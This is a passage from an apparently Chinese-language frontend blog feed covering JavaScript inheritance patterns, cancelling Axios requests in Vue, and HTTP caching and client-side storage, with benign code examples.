</span>&#123;</span><br><span class="line">    <span class="comment">// 1.获取私有属性</span></span><br><span class="line">    A.call(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.B.prototype.__proto__ = A.prototype</span></span><br><span class="line">B.prototype = <span class="built_in">Object</span>.create(A.prototype);</span><br><span class="line">B.prototype.constructor = B;</span><br><span class="line"></span><br><span class="line">B.prototype.getB = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</span><br></pre></td></tr></table></figure><p>组合继承融合了原型链和借用构造函数的优点，而且 instanceof 也能用于识别基于组合继承创建的对象，所以实践中最常用组合式继承</p><h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><p><strong>注意：</strong></p><ol><li><p>ES6 创造的就是类，不能当做普通函数执行，只能 new 执行</p></li><li><p>如果继承写 constructor 一定要写 super</p><p>其实静态属性不比写在 constructor 里面，使用 static 声明也可以</p></li><li><p>如果添加公有属性，只能通过 <code>prototype</code> 上添加，不能直接写在 class 里面</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="number">100</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// A.prototype.getX=function()&#123;&#125;</span></span><br><span class="line">  <span class="function"><span class="title">getX</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.x</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：继承后一定要在constructor加上super</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>() <span class="comment">// 类似call继承</span></span><br><span class="line">    <span class="built_in">this</span>.y = <span class="number">200</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getY</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.y</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;类三大特性&quot;&gt;&lt;a href=&quot;#类三大特性&quot; class=&quot;headerlink&quot; title=&quot;类三大特性&quot;&gt;&lt;/a&gt;类三大特性&lt;/h2&gt;&lt;p&gt;JS 本身是基于面向对象开发的编程语言。类：封装、继承、多态&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;封装：类是一个函数，把实现一个功能的代码进行封装，以此实现 “低耦合高内聚”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;多态：主要就是重载、重写两点&lt;/p&gt;
&lt;p&gt;重写：子类重写父类上的方法（伴随着继承运行）&lt;/p&gt;
&lt;p&gt;重载：相同的方法，由于参数或返回值不同，具备了不同的功能（JS 中不具备严格意义的重载；JS 中的重载，同一个方法内，根据传参不同实现不同的功能）&lt;/p&gt;
&lt;figure class=&quot;highlight typescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 函数重载（两个函数名称相同，参数个数/类型不同）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;...rest: &lt;span class=&quot;built_in&quot;&gt;number&lt;/span&gt;[]&lt;/span&gt;): &lt;span class=&quot;title&quot;&gt;number&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;...rest: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt;[]&lt;/span&gt;): &lt;span class=&quot;title&quot;&gt;string&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;...rest: &lt;span class=&quot;built_in&quot;&gt;any&lt;/span&gt;[]&lt;/span&gt;): &lt;span class=&quot;title&quot;&gt;any&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;function&quot;&gt;  &lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;first&lt;/span&gt; = &lt;span class=&quot;title&quot;&gt;rest&lt;/span&gt;[0]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;function&quot;&gt;  &lt;span class=&quot;title&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; first === &lt;span class=&quot;string&quot;&gt;&amp;#x27;string&amp;#x27;&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;span class=&quot;title&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;rest&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;join&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;  &lt;span class=&quot;title&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; first === &lt;span class=&quot;string&quot;&gt;&amp;#x27;number&amp;#x27;&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; rest.reduce(&lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;pre, cur&lt;/span&gt;) =&amp;gt;&lt;/span&gt; pre + cur)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;继承：子类继承父类的方法&lt;/p&gt;
&lt;p&gt;其它语言的继承跟生活中的继承很相似，子基因修改了但不会影响父（单独拷贝一份）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="原型链继承" scheme="http://llmysnow.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF/"/>
    
    <category term="call继承" scheme="http://llmysnow.top/tags/call%E7%BB%A7%E6%89%BF/"/>
    
    <category term="寄生组合式继承" scheme="http://llmysnow.top/tags/%E5%AF%84%E7%94%9F%E7%BB%84%E5%90%88%E5%BC%8F%E7%BB%A7%E6%89%BF/"/>
    
    <category term="类继承" scheme="http://llmysnow.top/tags/%E7%B1%BB%E7%BB%A7%E6%89%BF/"/>
    
  </entry>
  
  <entry>
    <title>Axios 取消请求</title>
    <link href="http://llmysnow.top/posts/a688a8da/"/>
    <id>http://llmysnow.top/posts/a688a8da/</id>
    <published>2021-08-31T02:16:08.889Z</published>
    <updated>2021-08-31T02:16:08.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>取消请求偶尔会用到，以下是两个工作中可能用到的场景</p><ol><li>如果一个数据请求量比较大（可能会请求错误），还没请求完就切换路由，可能会出现错误的提示框（响应拦截器中配置错误提示）</li><li>导出文件或下载文件时，中途取消</li><li>一个请求请求量比较大，发送新请求时需要取消上一个请求</li></ol><a id="more"></a><h2 id="取消单个请求（结合生命周期使用）"><a href="#取消单个请求（结合生命周期使用）" class="headerlink" title="取消单个请求（结合生命周期使用）"></a>取消单个请求（结合生命周期使用）</h2><ul><li>页面销毁时取消请求</li><li>重复发送请求取消上一次请求</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; generatePlan &#125; <span class="keyword">from</span> <span class="string">&#x27;@/api&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">destroyed</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.cancelPost()</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="function"><span class="title">generateList</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.$confirm(<span class="string">&#x27;生成时间比较长，您是否确定生成？&#x27;</span>, <span class="string">&#x27;警告&#x27;</span>, &#123;</span><br><span class="line">        confirmButtonText: <span class="string">&#x27;确定&#x27;</span>,</span><br><span class="line">        cancaelButtonText: <span class="string">&#x27;取消&#x27;</span>,</span><br><span class="line">      &#125;)</span><br><span class="line">        .then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> self = <span class="built_in">this</span></span><br><span class="line">          <span class="built_in">this</span>.cancelPost()</span><br><span class="line">          <span class="comment">// post请求</span></span><br><span class="line">          <span class="keyword">return</span> generatePlan(&#123;</span><br><span class="line">            params: <span class="built_in">this</span>.listQuery,</span><br><span class="line">            cancelToken: <span class="keyword">new</span> axios.CancelToken(<span class="function"><span class="keyword">function</span> <span class="title">exector</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">              self.$cancel = c</span><br><span class="line">            &#125;),</span><br><span class="line">          &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (res.code === <span class="number">200</span>) <span class="built_in">this</span>.list = res.data.result</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">() =&gt;</span> &#123;&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">cancelPost</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">typeof</span> <span class="built_in">this</span>.$cancel === <span class="string">&#x27;function&#x27;</span> ? <span class="built_in">this</span>.$cancel(<span class="string">&#x27;取消请求&#x27;</span>) : <span class="literal">null</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="取消所有请求（结合导航守卫）"><a href="#取消所有请求（结合导航守卫）" class="headerlink" title="取消所有请求（结合导航守卫）"></a>取消所有请求（结合导航守卫）</h2><p>思路：在请求拦截器中，给所有请求加一个 token，设置全局变量 source 控制 cancel token，在路由变化时调用 cancel 方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http.interceptors.request.use(</span><br><span class="line">  config =&gt; &#123;</span><br><span class="line">    config.cancelToken = store.source.token</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> CancelToken = axios.CancelToken</span><br><span class="line">  store.source.cancel &amp;&amp; store.source.cancel()</span><br><span class="line">  store.source = CancelToken.source()</span><br><span class="line">  next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="axios-取消请求原理"><a href="#axios-取消请求原理" class="headerlink" title="axios 取消请求原理"></a>axios 取消请求原理</h2><p>axios 是对 XMLHttpRequest 的封装，使用 XMLHttpRequest 实例的 abort()方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/axios/axios/blob/master/lib/adapters/xhr.js</span></span><br><span class="line"><span class="keyword">if</span> (config.cancelToken) &#123;</span><br><span class="line">  <span class="comment">// Handle cancellation</span></span><br><span class="line">  config.cancelToken.promise.then(<span class="function"><span class="keyword">function</span> <span class="title">onCanceled</span>(<span class="params">cancel</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!request) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request.abort()</span><br><span class="line">    reject(cancel)</span><br><span class="line">    <span class="comment">// Clean up request</span></span><br><span class="line">    request = <span class="literal">null</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;应用场景&quot;&gt;&lt;a href=&quot;#应用场景&quot; class=&quot;headerlink&quot; title=&quot;应用场景&quot;&gt;&lt;/a&gt;应用场景&lt;/h2&gt;&lt;p&gt;取消请求偶尔会用到，以下是两个工作中可能用到的场景&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果一个数据请求量比较大（可能会请求错误），还没请求完就切换路由，可能会出现错误的提示框（响应拦截器中配置错误提示）&lt;/li&gt;
&lt;li&gt;导出文件或下载文件时，中途取消&lt;/li&gt;
&lt;li&gt;一个请求请求量比较大，发送新请求时需要取消上一个请求&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Axios" scheme="http://llmysnow.top/tags/Axios/"/>
    
    <category term="二次封装" scheme="http://llmysnow.top/tags/%E4%BA%8C%E6%AC%A1%E5%B0%81%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>HTTP网络层性能优化</title>
    <link href="http://llmysnow.top/posts/2623edef/"/>
    <id>http://llmysnow.top/posts/2623edef/</id>
    <published>2021-08-31T02:16:08.889Z</published>
    <updated>2021-08-31T02:16:08.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="客户端和服务端之间的信息通信"><a href="#客户端和服务端之间的信息通信" class="headerlink" title="客户端和服务端之间的信息通信"></a>客户端和服务端之间的信息通信</h2><ul><li>ajax / fetch 数据交互</li><li>跨域处理方案：ajax、fetch、jsonp、postMessage</li><li>资源获取【html|、css、js、image、音视频】</li><li>webscoket</li></ul><a id="more"></a><p>请求：客户端把信息传递给服务器或者向服务器发送请求</p><p>响应：服务器接受客户端信息并且返回给客户端相关的内容</p><p>HTTP 报文：客户端和服务器之间的传输的所有内容</p><ul><li><p>起始行：基本信息【包含 HTTP 的版本等】</p><p>请求起始行：GET【请求方式】 xxx【请求地址】 HTTP/1.1【HTTP 版本号】</p><p>响应起始行：HTTP/1.1【HTTP 版本】 200【HTTP 响应状态码】 OK【状态码描述】</p></li><li><p>首部（头）：请求头【客户端-&gt;服务器】、响应头【服务器-&gt;客户端】</p></li><li><p>主体：请求主体【客户端-&gt;服务器】、响应主体【服务器-&gt;客户端】</p></li></ul><p>客户端和服务器之间的数据传输，依托于网络【通信模式 TCP/IP… 传输协议 HTTP/HTTPS/FTP…】</p><h2 id="从输入-URL-地址到看到页面，中间的经历"><a href="#从输入-URL-地址到看到页面，中间的经历" class="headerlink" title="从输入 URL 地址到看到页面，中间的经历"></a>从输入 URL 地址到看到页面，中间的经历</h2><ol><li>URL 解析</li><li>检查缓存【强缓存、协商缓存（针对资源文件请求）；本地缓存（针对数据请求）】</li><li>DNS 服务器解析【域名解析：根据域名解析出服务器外网 IP】</li><li>TCP 三次握手【建立客户端和服务器之间的网络连接通道】</li><li>基于 HTTP/HTTPS 等协议，实现客户端和服务端之间的信息通信</li><li>TCP 四次挥手【把建立好的网络通道释放掉】</li><li>客户端渲染【呈现出页面和效果】</li></ol><h3 id="URL-解析"><a href="#URL-解析" class="headerlink" title="URL 解析"></a>URL 解析</h3><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/URL%E8%A7%A3%E6%9E%90.jpg" alt="URL解析"></p><p>URI：统一资源标识符</p><ul><li>URL：统一资源定位符</li><li>URN：统一资源名称</li></ul><p><strong>传输协议：</strong> 用什么样的协议负责客户端和服务端的信息传输</p><ul><li><p>HTTP：超文本传输协议</p><p>除了传输文本还可以传输其余的信息，例如：文件流、二进制或者 Buffer 格式或者 BASE64 格式的数据</p></li><li><p>HTTPS：HTTP + SSL（TSL） 更安全的 HTTP，传输的内容经过加密</p></li><li><p>FTP：文件的上传下载</p></li></ul><p><strong>域名：</strong> 对服务器外网 IP 的一个重命名</p><p><code>www.baidu.com</code></p><ul><li>顶级域名 <code>baidu.com</code></li><li>一级域名 <code>www.baidu.com</code></li><li>二级域名 <code>video.baidu.com</code></li><li>三级域名 <code>image.video.baidu.com</code></li></ul><p>域名和服务器购买完后，需要在 DNS 服务器生成一条解析记录，用于以后的 DNS 解析</p><p><strong>端口号：</strong> 区分同一台服务器上不同的服务的</p><ul><li><p>取值范围：0~65535 之间</p></li><li><p>默认端口号：浏览器会根据输入的协议，给与默认端口号</p><p>HTTP -&gt; 80</p><p>HTTPS -&gt; 443</p><p>FTP -&gt; 21</p></li></ul><p><strong>请求资源的路径名称：</strong> 基于路径找到客户端需要的资源文件</p><p>看到的 URL 地址可能是重写后的【看到的地址在文件目录不存在】</p><ul><li><p>ajax 数据请求 <code>/api/list</code></p></li><li><p>url 重写</p><p>动态网址，页面中的内容是无法被搜索引擎收录的（不利于 SEO 优化）</p><p>静态化地址 <code>https://item.jd.com/....</code>，通过 URL 重写为 <code>https://item.jd.com/detail.jsp?id=...</code></p><p><code>https://item.jd.com/info/100000</code> 路径参数【导航】</p><p><code>https://www.baidu.com/info?id=100000</code></p></li></ul><p><strong>问号传参：</strong></p><ul><li><p>把信息参数传递给服务器，GET 系列请求一般都是这样传递参数</p><p><code>xxx=xxx&amp;xxx=xxx</code> -&gt; x-www-form-urlencoded 格式</p></li><li><p>如果是页面跳转，把信息传递给另一个页面</p></li></ul><p><strong>HASH 值：</strong></p><ul><li>锚点定位</li><li>HASH 路由</li></ul><p>URL 编译问题：</p><ul><li>encodeURI decodeURI：编译空格和中文，一般编译整个 URL 中的信息（前后端都支持的 API）</li><li>encodeURIComponent decodeURIComponent：编译空格和中文以及一些特殊符号，所以一般只用来编译传递的信息的值，而不是整个 URL（前后端都支持的 API）</li><li>escape unescape（用于客户端页面信息传递或一些信息的编译【cookie 中的中文内容编译】）</li><li>也可以基于自己设定的加密机制规则处理（对称加密）</li><li>对于某些数据，需要采用不可解密的（非对称加密），例如：md5</li></ul><h3 id="缓存检测"><a href="#缓存检测" class="headerlink" title="缓存检测"></a>缓存检测</h3><p><strong>缓存处理是基于 HTTP 网络层进行优化的一个非常重要的手段</strong> 【针对资源文件请求】</p><p>强缓存还是协商缓存都是服务器设置的，客户端浏览器自己会根据返回的一些信息，进行相关处理，无需前端单独设置东西</p><p><strong>缓存位置：</strong></p><ul><li>Memory Cache : 内存缓存（页面没有关闭，只是刷新）</li><li>Disk Cache：硬盘缓存（页面关闭后重新打开）</li></ul><p>打开网页：查找硬盘缓存中是否有匹配，如有则使用，如没有则发送网络请求</p><p>普通刷新（F5）：因 TAB 没关闭，因此内存缓存是可用的，会被优先使用，其次才是硬盘缓存</p><p>强制刷新（Ctrl + F5）：浏览器不使用缓存，因此发送的请求头均带有 <code>Cache-Control: no-cache</code>，服务器直接返回 200 和最新内容</p><p><strong>强缓存：</strong>  <code>Expires / Cache-Control</code></p><blockquote><p>Expires：缓存过期时间，用来指定资源到期的事件（HTTP/1.0）</p><p>Cache-Control：<code>cache-control: public, max-age=2592000</code> 第一次拿到资源后的 2592000 秒内（30 天），再次发生请求，读取缓存中的信息（HTTP/1.1）</p></blockquote><ul><li>如果获取的是强缓存信息，HTTP 状态码是 <strong>200</strong></li><li>如果是从服务器成功重新获取，HTTP 状态码也是 <strong>200</strong></li></ul><p>问题：本地缓存了文件，但是服务对应的资源文件更新了，如何保证获取的是最新的内容？</p><ol><li>所有请求的资源文件（css / js / 图片）后面都带一个时间戳</li><li>每一次资源的更新，基于 webpack 生成不同的资源名称（HASH 值）</li></ol><p>所以 HTML 永远不会做强缓存，资源文件一般会使用 强缓存+协商缓存</p><p><strong>协商缓存：</strong> <code>Last-Modified / ETag</code></p><blockquote><p>Last-Modified：记录服务器资源文件最后一次更新的时间（HTTP/1.0）请求头： <code>If-Modified-Since</code></p><p>ETag：只要服务器资源文件改变，会生成一个不同的标识（HTTP/1.1）请求头： <code>If-None-Match</code></p></blockquote><p>当强缓存失效（不存在）【html 可以做协商缓存】，会校验协商缓存，每一次都会向服务器校验资源是否更新</p><ul><li>如果没有更新，返回 <strong>304</strong> 通知客户端读取缓存信息，从本地缓存中获取内容进行渲染</li><li>如果有更新，返回 <strong>200</strong> 及最新资源信息，直接渲染，并把最新的 Last-Modified / ETag 和最新的资源信息缓存到本地</li></ul><p><strong>数据缓存：</strong></p><p>没有缓存数据，从服务器拉取最新数据；有缓存数据，直接读取缓存数据【减少和服务器之间的交互频率，降低服务器压力，也可以提高页面的渲染速度】</p><ul><li>页面不刷新，某些内容频繁操作，但是数据不是需要实时更新，可以做缓存【不经常更新的数据】</li><li>页面只要不关闭，直接读取缓存，如果页面关闭，重新打开我们也可以读取缓存中的数据【数据更新频率更低，可以设置过期时间】</li></ul><p>客户端存储数据的方案：</p><ol><li>（全局）变量存储【vuex / redux】：页面刷新或关闭后打开，之前存储的数据都没有（内存释放）</li><li>cookie</li><li>webStorage：LocalStorage SessionStorage</li><li>IndexedDB 浏览器数据库存储</li><li>Cache</li><li>Manifest 离线存储</li></ol><p><strong>LocalStorage V.S. SessionStorage</strong></p><ul><li>LocalStorage 持久化本地存储（没有过期时间），页面关闭存储内容也是存在的，除非用户手动清除 <code>removeItem clear</code></li><li>SessionStorage 会话存储，页面关闭后，存储的信息会消息【页面刷新不消失】</li></ul><p><strong>Cookie V.S. LocalStorage</strong></p><ul><li><p>Cookie 只允许一个源下最多存储 4KB 内容，所以不能存储太多的数据</p><p>本地存储的数据是由同源访问限制的，只允许读取本源下存储的内容</p></li><li><p>LocalStorage 可以在同源下存储 5MB 内容</p><br></li><li><p>Cookie 需要设置过期时间，超过时间就失效，并且有路径限制</p></li><li><p>LocalStorage 持久化存储，没有过期时间，除非手动清除</p><br></li><li><p>Cookie 不稳定</p><p>基于安全卫士或浏览器自带的清除操作，会把 Cookie 删除掉，开启无痕浏览，不能存储 Cookie</p></li><li><p>LocalStorage 不受这些操作影响</p><br></li><li><p>Cookie 兼容低版本浏览器</p></li><li><p>LocalStorage HTML5 新增的 API【不兼容 IE8 以下浏览器】</p><br></li><li><p>Cookie 不算严格本地存储</p><p>客户端向服务器发送请求，会默认把本地的 Cookie 基于请求头发送给服务器，并且服务器返回的响应头中有 Set-Cookie 字段，浏览器会默认把这些信息种在客户端本地中</p></li><li><p>LocalStorage 严格本地存储，默认情况下和服务器没有任何关系</p></li></ul><p>想要基于 ajax 获取数据，必须要保证当前页面的运行是在 http/https 协议下，file 文件协议不行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    xhr.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.json&#x27;</span>)</span><br><span class="line">    xhr.onreadystatechange = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span 